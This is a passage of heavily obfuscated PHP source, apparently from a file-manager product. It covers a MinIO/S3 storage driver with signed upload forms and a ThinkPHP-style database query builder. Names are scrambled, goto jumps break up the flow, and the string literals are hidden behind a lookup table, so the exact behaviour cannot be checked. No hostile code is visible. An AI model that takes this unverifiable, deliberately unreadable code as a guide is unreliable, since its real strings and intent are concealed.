objectMeta($ÁäŠÔ®ó) { return $this->cacheMethod($_SERVER[”ú…±Ú¥][167], $ÁäŠÔ®ó); } protected function _objectMeta($µşİèÙË) { $‹û¨Ú½ß =& $_SERVER[”ú…±Ú¥]; $µşİèÙË = rtrim($µşİèÙË, $‹û¨Ú½ß[8]); try { $ïëì¢í = $this->client->getObjectInfo($this->bucket, $µşİèÙË); if (!isset($ïëì¢í[$‹û¨Ú½ß[231]]) && isset($ïëì¢í[$‹û¨Ú½ß[246]])) { $ïëì¢í[$‹û¨Ú½ß[231]] = $ïëì¢í[$‹û¨Ú½ß[246]]; } } catch (Exception $ˆ²¦°î¦) { $ïëì¢í = !1; } if (!$ïëì¢í) { } return $ïëì¢í; } protected function _isFolder($…ùõ¤è») { $…Ğ˜Ú÷ =& $_SERVER[”ú…±Ú¥]; $…ùõ¤è» = rtrim($…ùõ¤è», $…Ğ˜Ú÷[8]); if ($…ùõ¤è» == $…Ğ˜Ú÷[12] || $…ùõ¤è» == $…Ğ˜Ú÷[8]) { return !0; } $Õ³Ù—²³ = $this->client->getBucket($this->bucket, $…ùõ¤è», null, 1); if (empty($Õ³Ù—²³[$…Ğ˜Ú÷[214]])) { return !1; } $Ñ¾Åìıí = $Õ³Ù—²³[$…Ğ˜Ú÷[214]][0][$…Ğ˜Ú÷[32]]; return stripos($Ñ¾Åìıí, $…ùõ¤è» . $…Ğ˜Ú÷[8]) === 0 ? !0 : !1; if (substr($Ñ¾Åìıí, -1) == $…Ğ˜Ú÷[8]) { return !0; } if (get_path_this($Ñ¾Åìıí) == get_path_this($…ùõ¤è»)) { return !1; } return !0; } } goto EÕÈæ¿ò¾; EÕÈæ¿ò¾: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Ôï•—ÔÇ) { parent::__construct($Ôï•—ÔÇ); $this->signatureVersion($_SERVER[”ú…±Ú¥][226]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($ğì¬–œ, $˜ƒÓñÅú = 3600) { $µ«éı‚‹ =& $_SERVER[”ú…±Ú¥]; $âµ‘² ¾ = $µ«éı‚‹[209]; $•€ò“± = $µ«éı‚‹[247]; $¢ñšÙè = $µ«éı‚‹[62]; $«Ğ‰Û = gmdate($µ«éı‚‹[248]); $åË½ù…³ = gmdate($µ«éı‚‹[249]); $¥ù·ü¢Ñ = $µ«éı‚‹[250]; $ŞÍ¥¨ìé = $˜ƒÓñÅú . $µ«éı‚‹[12]; $öæ…„²ê = $µ«éı‚‹[251]; $½¥Ï²¦ğ = array($this->accessKey, $åË½ù…³, $this->region, $¢ñšÙè, $¥ù·ü¢Ñ); $ªø²Ø¿ª = implode($µ«éı‚‹[8], $½¥Ï²¦ğ); $ŸñÇÒç  = array($µ«éı‚‹[252] => gmdate($µ«éı‚‹[253], strtotime($µ«éı‚‹[254])), $µ«éı‚‹[255] => array(array($µ«éı‚‹[256] => $this->bucket), array($µ«éı‚‹[257] => $âµ‘² ¾), array($µ«éı‚‹[258], $µ«éı‚‹[259], $µ«éı‚‹[12]), array($µ«éı‚‹[258], $µ«éı‚‹[260], $µ«éı‚‹[12]), array($µ«éı‚‹[258], $µ«éı‚‹[261], $µ«éı‚‹[12]), array($µ«éı‚‹[262] => $öæ…„²ê), array($µ«éı‚‹[263] => $ªø²Ø¿ª), array($µ«éı‚‹[264] => $•€ò“±), array($µ«éı‚‹[265] => $«Ğ‰Û), array($µ«éı‚‹[266] => $ŞÍ¥¨ìé))); $Éª×Ğ“ = base64_encode(json_encode($ŸñÇÒç )); $¿œÃéô÷ = hash_hmac($µ«éı‚‹[267], $åË½ù…³, $µ«éı‚‹[268] . $this->secret, !0); $ô½ÑµŞ¼ = hash_hmac($µ«éı‚‹[267], $this->region, $¿œÃéô÷, !0); $¿Õê‘È› = hash_hmac($µ«éı‚‹[267], $¢ñšÙè, $ô½ÑµŞ¼, !0); $Şªëô¬¢ = hash_hmac($µ«éı‚‹[267], $¥ù·ü¢Ñ, $¿Õê‘È›, !0); $¾Â™ã´Ô = hash_hmac($µ«éı‚‹[267], $Éª×Ğ“, $Şªëô¬¢); $ Õ³È = array($µ«éı‚‹[225] => $µ«éı‚‹[12], $µ«éı‚‹[269] => $µ«éı‚‹[12], $µ«éı‚‹[257] => $âµ‘² ¾, $µ«éı‚‹[262] => $öæ…„²ê, $µ«éı‚‹[270] => $Éª×Ğ“, $µ«éı‚‹[271] => $ªø²Ø¿ª, $µ«éı‚‹[272] => $•€ò“±, $µ«éı‚‹[273] => $«Ğ‰Û, $µ«éı‚‹[274] => $ŞÍ¥¨ìé, $µ«éı‚‹[275] => $¾Â™ã´Ô, $µ«éı‚‹[182] => $this->getHost()); return $ Õ³È; } } define($_SERVER[”ú…±Ú¥][276], 1); define($_SERVER[”ú…±Ú¥][277], 2); goto a´¤ÜÂÒ±º; Dß²…–ã¡: class DbSqlite3 extends DbSqlite3Base { public function query($ó¿‰Í†³) { $ÇôªÃÑ„ =& $_SERVER[”ú…±Ú¥]; if (!CacheLock::fileLock($ÇôªÃÑ„[13])) { return !1; } $Ô¤ïå³Ã = parent::query($ó¿‰Í†³); CacheLock::fileUnLock($ÇôªÃÑ„[13]); return $Ô¤ïå³Ã; } public function execute($¶Ïß§ë) { $ÀÌÜÆ‡ =& $_SERVER[”ú…±Ú¥]; if (!CacheLock::fileLock($ÀÌÜÆ‡[13])) { return !1; } $ÉïŒ¬…˜ = parent::execute($¶Ïß§ë); CacheLock::fileUnLock($ÀÌÜÆ‡[13]); return $ÉïŒ¬…˜; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\x69\x6e\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\75", "\x6e\x65\161" => "\74\76", "\147\x74" => "\x3e", "\x65\147\x74" => "\76\75", "\x6c\164" => "\74", "\145\x6c\164" => "\x3c\x3d", "\x6e\x6f\164\x6c\151\x6b\145" => "\116\117\124\x20\114\x49\113\105", "\x6c\x69\153\145" => "\114\x49\x4b\x45", "\x69\156" => "\111\116", "\x6e\x6f\x74\x69\156" => "\116\x4f\x54\40\111\x4e", "\x6e\x6f\x74\40\x69\x6e" => "\x4e\117\124\40\111\x4e", "\142\145\164\167\x65\x65\156" => "\102\x45\124\x57\x45\105\x4e", "\156\157\x74\x62\x65\x74\x77\x65\x65\x6e" => "\116\117\x54\x20\102\105\124\127\x45\105\x4e", "\x6e\x6f\x74\40\x62\145\164\x77\x65\145\156" => "\116\117\124\40\x42\x45\x54\x57\x45\x45\116"); protected $selectSql = "\123\x45\114\105\x43\124\45\104\x49\x53\124\x49\x4e\x43\124\45\40\45\106\111\105\114\x44\45\40\x46\122\x4f\x4d\40\45\x54\x41\x42\114\x45\45\x25\112\x4f\111\x4e\45\x25\127\110\x45\122\x45\45\x25\107\x52\x4f\x55\120\45\x25\110\x41\x56\x49\x4e\107\x25\x25\117\122\x44\105\122\45\x25\114\x49\115\111\x54\x25\40\45\x55\x4e\x49\117\116\x25\x25\x43\x4f\x4d\x4d\105\116\124\45"; protected $bind = array(); public static function getInstance() { $ñé¤Å‚‡ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[”ú…±Ú¥][989], $ñé¤Å‚‡); } public function factory($Ó©şòù = '') { $Æ¿æÔ½ì =& $_SERVER[”ú…±Ú¥]; $Ó©şòù = $this->parseConfig($Ó©şòù); if (empty($Ó©şòù[$Æ¿æÔ½ì[990]])) { think_exception(think_lang($Æ¿æÔ½ì[991])); } $this->dbType = ucwords(strtolower($Ó©şòù[$Æ¿æÔ½ì[990]])); $–‰»¾á“ = $Æ¿æÔ½ì[992] . $this->dbType; if (class_exists($–‰»¾á“)) { $²®©÷Â = new $–‰»¾á“($Ó©şòù); if ($Æ¿æÔ½ì[993] != strtolower($Ó©şòù[$Æ¿æÔ½ì[990]])) { $²®©÷Â->dbType = strtoupper($this->dbType); } else { $²®©÷Â->dbType = $this->_getDsnType($Ó©şòù[$Æ¿æÔ½ì[945]]); } } else { think_exception(think_lang($Æ¿æÔ½ì[994]) . $Æ¿æÔ½ì[995] . $–‰»¾á“); } return $²®©÷Â; } public function __call($´³ûŞóê, $›ğ°Œ¤¹) { if (method_exists($this, $´³ûŞóê)) { return call_user_func_array(array($this, $´³ûŞóê), $›ğ°Œ¤¹); } } protected function _getDsnType($Äœ„ñ¾Š) { $çİç´¶ı = explode($_SERVER[”ú…±Ú¥][4], $Äœ„ñ¾Š); $í¼ƒõÇ€ = strtoupper(trim($çİç´¶ı[0])); return $í¼ƒõÇ€; } private function parseConfig($íˆò¶£ë = '') { $Î¦ñ²• =& $_SERVER[”ú…±Ú¥]; if (!empty($íˆò¶£ë) && is_string($íˆò¶£ë)) { $íˆò¶£ë = $this->parseDSN($íˆò¶£ë); } elseif (is_array($íˆò¶£ë)) { $íˆò¶£ë = array_change_key_case($íˆò¶£ë); $íˆò¶£ë = array($Î¦ñ²•[990] => $íˆò¶£ë[$Î¦ñ²•[996]], $Î¦ñ²•[917] => $íˆò¶£ë[$Î¦ñ²•[997]], $Î¦ñ²•[918] => $íˆò¶£ë[$Î¦ñ²•[998]], $Î¦ñ²•[915] => $íˆò¶£ë[$Î¦ñ²•[999]], $Î¦ñ²•[916] => $íˆò¶£ë[$Î¦ñ²•[1000]], $Î¦ñ²•[21] => $íˆò¶£ë[$Î¦ñ²•[1001]], $Î¦ñ²•[945] => $íˆò¶£ë[$Î¦ñ²•[1002]], $Î¦ñ²•[17] => isset($íˆò¶£ë[$Î¦ñ²•[1003]]) ? $íˆò¶£ë[$Î¦ñ²•[1003]] : array()); } elseif (empty($íˆò¶£ë)) { if (think_config($Î¦ñ²•[1004]) && $Î¦ñ²•[993] != strtolower(think_config($Î¦ñ²•[1005]))) { $íˆò¶£ë = $this->parseDSN(think_config($Î¦ñ²•[1004])); } else { $íˆò¶£ë = array($Î¦ñ²•[990] => think_config($Î¦ñ²•[1005]), $Î¦ñ²•[917] => think_config($Î¦ñ²•[1006]), $Î¦ñ²•[918] => think_config($Î¦ñ²•[1007]), $Î¦ñ²•[915] => think_config($Î¦ñ²•[1008]), $Î¦ñ²•[916] => think_config($Î¦ñ²•[1009]), $Î¦ñ²•[21] => think_config($Î¦ñ²•[284]), $Î¦ñ²•[945] => think_config($Î¦ñ²•[1004]), $Î¦ñ²•[17] => think_config($Î¦ñ²•[1010])); } } return $íˆò¶£ë; } protected function initConnect($‹âáĞ“ƒ = true) { if (1 == think_config($_SERVER[”ú…±Ú¥][22])) { $this->_linkID = $this->multiConnect($‹âáĞ“ƒ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ñÁ‹¥¿ => $øÊéø™) { $this->_linkID = $øÊéø™; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($î¹šºÓÕ = false) { $‡®Û¾ğÙ =& $_SERVER[”ú…±Ú¥]; static $‡µ—–‚æ = array(); static $§›âÜÒş = -1; if (empty($‡µ—–‚æ)) { foreach ($this->config as $í…•È©‹ => $Õó€é™´) { $‡µ—–‚æ[$í…•È©‹] = explode($‡®Û¾ğÙ[50], $Õó€é™´); } } if (think_config($‡®Û¾ğÙ[1011])) { if ($î¹šºÓÕ || think_config($‡®Û¾ğÙ[433]) === !0) { $«¾ëıˆÌ = floor(mt_rand(0, think_config($‡®Û¾ğÙ[1012]) - 1)); $§›âÜÒş = $«¾ëıˆÌ; } else { if (is_numeric(think_config($‡®Û¾ğÙ[1013]))) { $«¾ëıˆÌ = think_config($‡®Û¾ğÙ[1013]); } else { $«¾ëıˆÌ = floor(mt_rand(think_config($‡®Û¾ğÙ[1012]), count($‡µ—–‚æ[$‡®Û¾ğÙ[915]]) - 1)); } } } else { $«¾ëıˆÌ = floor(mt_rand(0, count($‡µ—–‚æ[$‡®Û¾ğÙ[915]]) - 1)); $§›âÜÒş = $«¾ëıˆÌ; } $«¾ëıˆÌ = $§›âÜÒş !== -1 ? $§›âÜÒş : $«¾ëıˆÌ; $·ªĞ“ = array($‡®Û¾ğÙ[917] => isset($‡µ—–‚æ[$‡®Û¾ğÙ[917]][$«¾ëıˆÌ]) ? $‡µ—–‚æ[$‡®Û¾ğÙ[917]][$«¾ëıˆÌ] : $‡µ—–‚æ[$‡®Û¾ğÙ[917]][0], $‡®Û¾ğÙ[918] => isset($‡µ—–‚æ[$‡®Û¾ğÙ[918]][$«¾ëıˆÌ]) ? $‡µ—–‚æ[$‡®Û¾ğÙ[918]][$«¾ëıˆÌ] : $‡µ—–‚æ[$‡®Û¾ğÙ[918]][0], $‡®Û¾ğÙ[915] => isset($‡µ—–‚æ[$‡®Û¾ğÙ[915]][$«¾ëıˆÌ]) ? $‡µ—–‚æ[$‡®Û¾ğÙ[915]][$«¾ëıˆÌ] : $‡µ—–‚æ[$‡®Û¾ğÙ[915]][0], $‡®Û¾ğÙ[916] => isset($‡µ—–‚æ[$‡®Û¾ğÙ[916]][$«¾ëıˆÌ]) ? $‡µ—–‚æ[$‡®Û¾ğÙ[916]][$«¾ëıˆÌ] : $‡µ—–‚æ[$‡®Û¾ğÙ[916]][0], $‡®Û¾ğÙ[21] => isset($‡µ—–‚æ[$‡®Û¾ğÙ[21]][$«¾ëıˆÌ]) ? $‡µ—–‚æ[$‡®Û¾ğÙ[21]][$«¾ëıˆÌ] : $‡µ—–‚æ[$‡®Û¾ğÙ[21]][0], $‡®Û¾ğÙ[945] => isset($‡µ—–‚æ[$‡®Û¾ğÙ[945]][$«¾ëıˆÌ]) ? $‡µ—–‚æ[$‡®Û¾ğÙ[945]][$«¾ëıˆÌ] : $‡µ—–‚æ[$‡®Û¾ğÙ[945]][0], $‡®Û¾ğÙ[17] => isset($‡µ—–‚æ[$‡®Û¾ğÙ[17]][$«¾ëıˆÌ]) ? $‡µ—–‚æ[$‡®Û¾ğÙ[17]][$«¾ëıˆÌ] : $‡µ—–‚æ[$‡®Û¾ğÙ[17]][0]); return $this->connect($·ªĞ“, $«¾ëıˆÌ); } public function parseDSN($ªà••İ) { $øé˜ı„” =& $_SERVER[”ú…±Ú¥]; if (empty($ªà••İ)) { return !1; } $…«İ‡®µ = parse_url($ªà••İ); if ($…«İ‡®µ[$øé˜ı„”[181]]) { $¦§ÉÀá­ = array($øé˜ı„”[990] => $…«İ‡®µ[$øé˜ı„”[181]], $øé˜ı„”[917] => isset($…«İ‡®µ[$øé˜ı„”[628]]) ? $…«İ‡®µ[$øé˜ı„”[628]] : $øé˜ı„”[12], $øé˜ı„”[918] => isset($…«İ‡®µ[$øé˜ı„”[1014]]) ? $…«İ‡®µ[$øé˜ı„”[1014]] : $øé˜ı„”[12], $øé˜ı„”[915] => isset($…«İ‡®µ[$øé˜ı„”[182]]) ? $…«İ‡®µ[$øé˜ı„”[182]] : $øé˜ı„”[12], $øé˜ı„”[916] => isset($…«İ‡®µ[$øé˜ı„”[183]]) ? $…«İ‡®µ[$øé˜ı„”[183]] : $øé˜ı„”[12], $øé˜ı„”[21] => isset($…«İ‡®µ[$øé˜ı„”[84]]) ? substr($…«İ‡®µ[$øé˜ı„”[84]], 1) : $øé˜ı„”[12]); } else { preg_match($øé˜ı„”[1015], trim($ªà••İ), $«î¢‡Œ…); $¦§ÉÀá­ = array($øé˜ı„”[990] => $«î¢‡Œ…[1], $øé˜ı„”[917] => $«î¢‡Œ…[2], $øé˜ı„”[918] => $«î¢‡Œ…[3], $øé˜ı„”[915] => $«î¢‡Œ…[4], $øé˜ı„”[916] => $«î¢‡Œ…[5], $øé˜ı„”[21] => $«î¢‡Œ…[6]); } $¦§ÉÀá­[$øé˜ı„”[945]] = $øé˜ı„”[12]; return $¦§ÉÀá­; } protected function debug() { $‚Ë²Â”æ =& $_SERVER[”ú…±Ú¥]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $‚Ë²Â”æ[1016]; if (think_config($‚Ë²Â”æ[1017])) { think_status($‚Ë²Â”æ[1018]); think_trace($this->queryStr . $‚Ë²Â”æ[1019] . think_status($‚Ë²Â”æ[24], $‚Ë²Â”æ[1018], 6) . $‚Ë²Â”æ[1020], $‚Ë²Â”æ[12], $‚Ë²Â”æ[1021]); } } protected function parseLock($ÀÃÆïµ = false) { $é¸ôüäÛ =& $_SERVER[”ú…±Ú¥]; if (!$ÀÃÆïµ) { return $é¸ôüäÛ[12]; } if ($é¸ôüäÛ[947] == $this->dbType) { return $é¸ôüäÛ[1022]; } return $é¸ôüäÛ[1023]; } protected function parseSet($ä‡‚êæµ) { $öï—ïèë =& $_SERVER[”ú…±Ú¥]; foreach ($ä‡‚êæµ as $åÍÇéÚ¹ => $â¦ğï¾) { if (is_array($â¦ğï¾) && $öï—ïèë[335] == $â¦ğï¾[0]) { $‰¼ĞÛèˆ[] = $this->parseKey($åÍÇéÚ¹) . $öï—ïèë[913] . $â¦ğï¾[1]; } elseif (is_scalar($â¦ğï¾) || is_null($â¦ğï¾)) { $‰¼ĞÛèˆ[] = $this->parseKey($åÍÇéÚ¹) . $öï—ïèë[913] . $this->parseValue($â¦ğï¾); } } return $öï—ïèë[1024] . implode($öï—ïèë[50], $‰¼ĞÛèˆ); } protected function bindParam($âùĞ‡›, $¢ªô®‚À) { $this->bind[$_SERVER[”ú…±Ú¥][4] . $âùĞ‡›] = $¢ªô®‚À; } protected function parseBind($ŠÇ¡¤”À) { $ŠÇ¡¤”À = array_merge($this->bind, $ŠÇ¡¤”À); $this->bind = array(); return $ŠÇ¡¤”À; } function parseKey(&$¾ùŸÂşÖ, $ËïöÅƒ± = true) { if ($ËïöÅƒ±) { $¾ùŸÂşÖ = $this->parseKeyCheck($¾ùŸÂşÖ); } return $¾ùŸÂşÖ; } function parseKeyCheck($ˆõÜŠæ×) { $˜êÔßÀ =& $_SERVER[”ú…±Ú¥]; $ˆõÜŠæ× = trim($ˆõÜŠæ×); if (!preg_match($˜êÔßÀ[1025], $ˆõÜŠæ×)) { think_exception($˜êÔßÀ[1026] . $ˆõÜŠæ×); } return $ˆõÜŠæ×; } protected function parseValue($¨õòõ—‰) { $‡ïñè²” =& $_SERVER[”ú…±Ú¥]; if (is_string($¨õòõ—‰)) { $¨õòõ—‰ = $‡ïñè²”[986] . $this->escapeString($¨õòõ—‰) . $‡ïñè²”[986]; } elseif (isset($¨õòõ—‰[0]) && is_string($¨õòõ—‰[0]) && strtolower($¨õòõ—‰[0]) == $‡ïñè²”[335]) { $¨õòõ—‰ = $this->escapeString($¨õòõ—‰[1]); } elseif (is_array($¨õòõ—‰)) { $¨õòõ—‰ = array_map(array($this, $‡ïñè²”[987]), $¨õòõ—‰); } elseif (is_bool($¨õòõ—‰)) { $¨õòõ—‰ = $¨õòõ—‰ ? $‡ïñè²”[88] : $‡ïñè²”[208]; } elseif (is_null($¨õòõ—‰)) { $¨õòõ—‰ = $‡ïñè²”[103]; } return $¨õòõ—‰; } protected function parseField($ÒÌÀé¤È) { $€üÇï =& $_SERVER[”ú…±Ú¥]; if (is_string($ÒÌÀé¤È) && strpos($ÒÌÀé¤È, $€üÇï[50])) { $ÒÌÀé¤È = explode($€üÇï[50], $ÒÌÀé¤È); } if (is_array($ÒÌÀé¤È)) { $§úÜ×Ø½ = array(); foreach ($ÒÌÀé¤È as $§—Çˆ®‚ => $îÔôÛøà) { if (!is_numeric($§—Çˆ®‚)) { $§úÜ×Ø½[] = $this->parseKey($§—Çˆ®‚, !1) . $€üÇï[1027] . $this->parseKey($îÔôÛøà); } else { $§úÜ×Ø½[] = $this->parseKey($îÔôÛøà); } } $³æó÷šÛ = implode($€üÇï[50], $§úÜ×Ø½); } elseif (is_string($ÒÌÀé¤È) && !empty($ÒÌÀé¤È)) { $³æó÷šÛ = $ÒÌÀé¤È; } else { $³æó÷šÛ = $€üÇï[199]; } return $³æó÷šÛ; } protected function parseTable($Ä‹ãšŠµ) { $Ûİ¼œ†Ç =& $_SERVER[”ú…±Ú¥]; if (is_array($Ä‹ãšŠµ)) { $ ³É–ú = array(); foreach ($Ä‹ãšŠµ as $å¹ªÜÉĞ => $¦‘‰¿š) { if (!is_numeric($å¹ªÜÉĞ)) { $ ³É–ú[] = $this->parseKey($å¹ªÜÉĞ) . $Ûİ¼œ†Ç[53] . $this->parseKey($¦‘‰¿š); } else { $ ³É–ú[] = $this->parseKey($å¹ªÜÉĞ); } } $Ä‹ãšŠµ = $ ³É–ú; } elseif (is_string($Ä‹ãšŠµ)) { if (strstr($Ä‹ãšŠµ, $Ûİ¼œ†Ç[53])) { return $Ä‹ãšŠµ; } $Ä‹ãšŠµ = explode($Ûİ¼œ†Ç[50], $Ä‹ãšŠµ); array_walk($Ä‹ãšŠµ, array($this, $Ûİ¼œ†Ç[935])); } return $Ûİ¼œ†Ç[929] . trim(implode($Ûİ¼œ†Ç[1028], $Ä‹ãšŠµ), $Ûİ¼œ†Ç[423]) . $Ûİ¼œ†Ç[929]; } protected function parseWhere($éæî›±ò) { $˜¦ò²µ· =& $_SERVER[”ú…±Ú¥]; $ö·İªê = $˜¦ò²µ·[12]; if (is_string($éæî›±ò)) { $ö·İªê = $éæî›±ò; } else { $–°ÎÀ‘ = isset($éæî›±ò[$˜¦ò²µ·[1029]]) ? strtoupper($éæî›±ò[$˜¦ò²µ·[1029]]) : $˜¦ò²µ·[12]; if (in_array($–°ÎÀ‘, array($˜¦ò²µ·[1030], $˜¦ò²µ·[1031], $˜¦ò²µ·[1032]))) { $–°ÎÀ‘ = $˜¦ò²µ·[53] . $–°ÎÀ‘ . $˜¦ò²µ·[53]; unset($éæî›±ò[$˜¦ò²µ·[1029]]); } else { $–°ÎÀ‘ = $˜¦ò²µ·[1033]; } foreach ($éæî›±ò as $êâÖÒú– => $ŒÑš®âÆ) { $ö·İªê .= $˜¦ò²µ·[315]; if (is_numeric($êâÖÒú–)) { $êâÖÒú– = $˜¦ò²µ·[1034]; } if (0 === strpos($êâÖÒú–, $˜¦ò²µ·[11])) { $ö·İªê .= $this->parseThinkWhere($êâÖÒú–, $ŒÑš®âÆ); } else { if (!preg_match($˜¦ò²µ·[1035], trim($êâÖÒú–))) { think_exception(think_lang($˜¦ò²µ·[1036]) . $˜¦ò²µ·[4] . $êâÖÒú–); } $ö«­•àÅ = is_array($ŒÑš®âÆ) && isset($ŒÑš®âÆ[$˜¦ò²µ·[1037]]); $êâÖÒú– = trim($êâÖÒú–); if (strpos($êâÖÒú–, $˜¦ò²µ·[321])) { $ôÔË©¸ = explode($˜¦ò²µ·[321], $êâÖÒú–); $îé¨Š— = array(); foreach ($ôÔË©¸ as $°¸šï—‡ => $…ü«¢€‚) { $Ÿà–ƒ– = $ö«­•àÅ ? $ŒÑš®âÆ[$°¸šï—‡] : $ŒÑš®âÆ; $îé¨Š—[] = $˜¦ò²µ·[298] . $this->parseWhereItem($this->parseKey($…ü«¢€‚), $Ÿà–ƒ–) . $˜¦ò²µ·[934]; } $ö·İªê .= implode($˜¦ò²µ·[1038], $îé¨Š—); } elseif (strpos($êâÖÒú–, $˜¦ò²µ·[322])) { $ôÔË©¸ = explode($˜¦ò²µ·[322], $êâÖÒú–); $îé¨Š— = array(); foreach ($ôÔË©¸ as $°¸šï—‡ => $…ü«¢€‚) { $Ÿà–ƒ– = $ö«­•àÅ ? $ŒÑš®âÆ[$°¸šï—‡] : $ŒÑš®âÆ; $îé¨Š—[] = $˜¦ò²µ·[298] . $this->parseWhereItem($this->parseKey($…ü«¢€‚), $Ÿà–ƒ–) . $˜¦ò²µ·[934]; } $ö·İªê .= implode($˜¦ò²µ·[1033], $îé¨Š—); } else { $ö·İªê .= $this->parseWhereItem($this->parseKey($êâÖÒú–), $ŒÑš®âÆ); } } $ö·İªê .= $˜¦ò²µ·[316] . $–°ÎÀ‘; } $ö·İªê = substr($ö·İªê, 0, -strlen($–°ÎÀ‘)); } return empty($ö·İªê) ? $˜¦ò²µ·[12] : $˜¦ò²µ·[1039] . $ö·İªê; } protected function parseWhereItem($‘ßÔ¼í’, $¸Ã†õ™”) { $ÓŠ©ô”à =& $_SERVER[”ú…±Ú¥]; $¿ÊÌ­± = $ÓŠ©ô”à[12]; if (is_array($¸Ã†õ™”)) { if (is_string($¸Ã†õ™”[0])) { $Ìùí¢ = strtolower($¸Ã†õ™”[0]); if (in_array($¸Ã†õ™”[0], array($ÓŠ©ô”à[913], $ÓŠ©ô”à[1040], $ÓŠ©ô”à[1041], $ÓŠ©ô”à[1042], $ÓŠ©ô”à[1043], $ÓŠ©ô”à[1044]))) { $¿ÊÌ­± .= $‘ßÔ¼í’ . $ÓŠ©ô”à[53] . $¸Ã†õ™”[0] . $ÓŠ©ô”à[53] . $this->parseValue($¸Ã†õ™”[1]); } elseif (preg_match($ÓŠ©ô”à[1045], $¸Ã†õ™”[0])) { $¿ÊÌ­± .= $‘ßÔ¼í’ . $ÓŠ©ô”à[53] . $this->exp[$Ìùí¢] . $ÓŠ©ô”à[53] . $this->parseValue($¸Ã†õ™”[1]); } elseif (preg_match($ÓŠ©ô”à[1046], $¸Ã†õ™”[0])) { if (is_array($¸Ã†õ™”[1])) { $±ŞÏÈ•à = isset($¸Ã†õ™”[2]) ? strtoupper($¸Ã†õ™”[2]) : $ÓŠ©ô”à[1031]; if (in_array($±ŞÏÈ•à, array($ÓŠ©ô”à[1030], $ÓŠ©ô”à[1031], $ÓŠ©ô”à[1032]))) { $•ƒ—š = array(); foreach ($¸Ã†õ™”[1] as $ºŒ•ä®¥) { $•ƒ—š[] = $‘ßÔ¼í’ . $ÓŠ©ô”à[53] . $this->exp[$Ìùí¢] . $ÓŠ©ô”à[53] . $this->parseValue($ºŒ•ä®¥); } $¿ÊÌ­± .= $ÓŠ©ô”à[298] . implode($ÓŠ©ô”à[53] . $±ŞÏÈ•à . $ÓŠ©ô”à[53], $•ƒ—š) . $ÓŠ©ô”à[934]; } } else { $¿ÊÌ­± .= $‘ßÔ¼í’ . $ÓŠ©ô”à[53] . $this->exp[$Ìùí¢] . $ÓŠ©ô”à[53] . $this->parseValue($¸Ã†õ™”[1]); } } elseif ($ÓŠ©ô”à[335] == $Ìùí¢) { $¿ÊÌ­± .= $ÓŠ©ô”à[932] . $‘ßÔ¼í’ . $ÓŠ©ô”à[53] . $¸Ã†õ™”[1] . $ÓŠ©ô”à[1047]; } elseif (preg_match($ÓŠ©ô”à[1048], $¸Ã†õ™”[0])) { $¿ÊÌ­± .= $¸Ã†õ™”[0]; } elseif (preg_match($ÓŠ©ô”à[1049], $¸Ã†õ™”[0])) { if (isset($¸Ã†õ™”[2]) && $ÓŠ©ô”à[335] == $¸Ã†õ™”[2]) { $¿ÊÌ­± .= $‘ßÔ¼í’ . $ÓŠ©ô”à[53] . $this->exp[$Ìùí¢] . $ÓŠ©ô”à[53] . $¸Ã†õ™”[1]; } else { if (is_string($¸Ã†õ™”[1])) { $¸Ã†õ™”[1] = explode($ÓŠ©ô”à[50], $¸Ã†õ™”[1]); } $ì›Ê¸âÄ = implode($ÓŠ©ô”à[50], $this->parseValue($¸Ã†õ™”[1])); $¿ÊÌ­± .= $‘ßÔ¼í’ . $ÓŠ©ô”à[53] . $this->exp[$Ìùí¢] . $ÓŠ©ô”à[932] . $ì›Ê¸âÄ . $ÓŠ©ô”à[934]; } } elseif (preg_match($ÓŠ©ô”à[1050], $¸Ã†õ™”[0])) { $°³ŠàÁ² = is_string($¸Ã†õ™”[1]) ? explode($ÓŠ©ô”à[50], $¸Ã†õ™”[1]) : $¸Ã†õ™”[1]; $¿ÊÌ­± .= $ÓŠ©ô”à[932] . $‘ßÔ¼í’ . $ÓŠ©ô”à[53] . $this->exp[$Ìùí¢] . $ÓŠ©ô”à[53] . $this->parseValue($°³ŠàÁ²[0]) . $ÓŠ©ô”à[1033] . $this->parseValue($°³ŠàÁ²[1]) . $ÓŠ©ô”à[316]; } else { think_exception(think_lang($ÓŠ©ô”à[1036]) . $ÓŠ©ô”à[4] . $¸Ã†õ™”[0]); } } else { $Ü–¨’· = count($¸Ã†õ™”); $ØœÈ±º = $ÓŠ©ô”à[12]; if (is_string($¸Ã†õ™”[$Ü–¨’· - 1])) { $ØœÈ±º = isset($¸Ã†õ™”[$Ü–¨’· - 1]) ? strtoupper($¸Ã†õ™”[$Ü–¨’· - 1]) : $ÓŠ©ô”à[12]; if (in_array($ØœÈ±º, array($ÓŠ©ô”à[1030], $ÓŠ©ô”à[1031], $ÓŠ©ô”à[1032]))) { $Ü–¨’· = $Ü–¨’· - 1; } } else { $ØœÈ±º = $ÓŠ©ô”à[1030]; } for ($ª’”Ê µ = 0; $ª’”Ê µ < $Ü–¨’·; $ª’”Ê µ++) { $°³ŠàÁ² = is_array($¸Ã†õ™”[$ª’”Ê µ]) ? $¸Ã†õ™”[$ª’”Ê µ][1] : $¸Ã†õ™”[$ª’”Ê µ]; if ($ÓŠ©ô”à[335] == strtolower($¸Ã†õ™”[$ª’”Ê µ][0])) { $¿ÊÌ­± .= $ÓŠ©ô”à[298] . $‘ßÔ¼í’ . $ÓŠ©ô”à[53] . $°³ŠàÁ² . $ÓŠ©ô”à[1047] . $ØœÈ±º . $ÓŠ©ô”à[53]; } else { $‰û½ôå = is_array($¸Ã†õ™”[$ª’”Ê µ]) ? $this->exp[strtolower($¸Ã†õ™”[$ª’”Ê µ][0])] : $ÓŠ©ô”à[913]; if (!$‰û½ôå && 